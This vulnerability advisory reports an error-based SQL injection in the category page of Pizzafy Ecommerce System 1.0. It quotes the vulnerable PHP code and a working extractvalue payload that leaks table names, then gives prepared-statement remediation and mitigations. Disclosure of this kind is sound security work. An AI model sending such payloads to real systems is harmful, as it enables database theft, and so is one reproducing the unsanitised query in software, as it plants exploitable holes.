
## **Affected Version:**  
- **Pizzafy Ecommerce System**: 1.0  

## **Vulnerability Information:**  
- **Vulnerability Type:** SQL Injection (Based Error)  
- **Severity:** HIGH  
- **Status:** Unpatched  

## **Vulnerable Endpoint:**  
- `pizza/index.php?page=category&id=3`

## **Overview**
The Pizzafy Ecommerce System 1.0 contains multiple critical SQL Injection vulnerabilities that allow an attacker to extract sensitive data, bypass authentication, and get records from the database.

## **Vulnerability Description:**  
# Error-Based SQL Injection Vulnerability in SELECT Operation

## Vulnerability Description

A **Error-based SQL Injection vulnerability** was discovered in the **update functionality** of the **Pizzafy Ecommerce System 1.0**. This vulnerability occurs because the `id` parameter and `id` column is not properly sanitized, allowing an attacker to inject malicious SQL commands into the backend database query.

## Attack Technique

This attack relies on **Error-based SQL injection technique**, where the attacker uses functions to force the database to return sensitive data within error messages. When the system displays database errors, the attacker can:

- **Extract database names, table names, and column structures**
- **Retrieve usernames and password hashes**
- **Delete or manipulate sensitive records**
- **Escalate privileges through session data extraction**


## Impact

| Impact | Description |
|--------|-------------|
| **Confidentiality** | Full database schema and user credentials exposure |
| **Integrity** | Unauthorized deletion or modification of records |
| **Availability** | Mass deletion causing denial of service |
| **Privilege Escalation** | Session hijacking and administrative access |

## Proof of Concept (PoC)

### Vulnerable Code
```php
$cid= $_GET['id'] ?? "";
 if(empty($cid)){
    throw new ErrorException("Error: This page requires a category ID.");
 }
 $category_qry = $conn->query("SELECT * FROM category_list where id = $cid");
 if (!$category_qry) {
    print $conn->error;
 }

 if($category_qry->num_rows > 0){
    $data = $category_qry->fetch_assoc();

 }else{
    throw new ErrorException("Error: This page requires a category ID.");
 }
```

Below is a **GET** request demonstrating the vulnerability using a **Error-Based SQL injection payload**:  

```
http://localhost/pizza/index.php?page=category&id=1%20AND%20extractvalue(1,%20concat(0x7e,%20(SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20LIMIT%200,1)))%20--
```

### **Explanation:**  
This payload injects the SQL command:  

```sql
id=1%20AND%20extractvalue(1,%20concat(0x7e,%20(SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20LIMIT%200,1)))%20--
```
This makes it possible to get data from the database.

---

## Image

- ![](https://i.imgur.com/tiTIUSF.png)
---

## Remediation
```php
$cid = isset($_GET['id']) ? (int)$_GET['id'] : 0;

if(empty($cid) || $cid <= 0){
    throw new ErrorException("Error: This page requires a valid category ID.");
}

$stmt = $conn->prepare("SELECT * FROM category_list WHERE id = ?");
$stmt->bind_param("i", $cid);
$stmt->execute();
$category_qry = $stmt->get_result();

if (!$category_qry) {
    error_log("Database error: " . $conn->error);
    throw new ErrorException("An error occurred. Please try again later.");
}

if($category_qry->num_rows > 0){
    $data = $category_qry->fetch_assoc();
} else {
    throw new ErrorException("Error: Category not found.");
}
```

---

## **Mitigation Recommendations:**  
1. **Use Prepared Statements:** Employ parameterized queries to prevent SQL injection.  
2. **Input Validation:** Validate and sanitize the `id` parameter to allow only expected values.  
3. **Database Permissions:** Restrict database user privileges to limit the potential damage of SQL injections.  
4. **Monitoring & Logging:** Track and alert unusual patterns, such as slow queries or repetitive access attempts.  
5. **Security Testing:** Perform regular penetration testing and code reviews to identify and mitigate vulnerabilities.  
6. **Error Handling:** Avoid exposing database-related errors in responses, which may assist attackers.

## References
- **CWE-89:** Improper Neutralization of Special Elements used in an SQL Command
- **OWASP:** SQL Injection Prevention Cheat Sheet